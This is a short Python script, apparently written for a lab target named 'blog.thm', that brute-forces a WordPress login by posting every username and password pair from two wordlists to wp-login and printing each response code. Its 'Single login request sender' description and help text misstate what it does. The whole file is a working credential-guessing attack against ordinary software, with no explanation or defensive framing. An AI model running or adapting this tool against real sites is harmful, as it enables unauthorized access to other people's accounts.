#!/usr/bin/env python3
import argparse
import requests


def load_file(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="Single login request sender")
    parser.add_argument("--url", required=True, help="Login URL")
    parser.add_argument("--username", required=True, help="Username")
    parser.add_argument("--password", required=True, help="Password")
    args = parser.parse_args()

    users = load_file(args.username)
    passwords =load_file(args.password)
    url= args.url

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "wordpress_test_cookie=WP+Cookie+check",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "Host": "blog.thm",
        "Origin" :"http://blog.thm/"
    }

    for i in users:
        for j in passwords:
            payload = {
                "log": i,
                "pwd": j,
                "wp-submit": "Log In",
                "redirect_to": f"http://blog.thm/wp-admin/",
                "testcookie": "1"
            }
            #print("[+] Sending POST request to:", args.url)
            #print(requests.post(url, data=payload))
            response = requests.post(url, data=payload, headers=headers)
            s = requests.Session()
            req = requests.Request(method="POST", url=url, data=payload, headers=headers)
            prepped = s.prepare_request(req)
            print(prepped.body)
            #if response.status_code == "302":
            print(f"[+] Username: {i} & Password:{j} Status Code:", response.status_code)


if __name__ == "__main__":
    main()
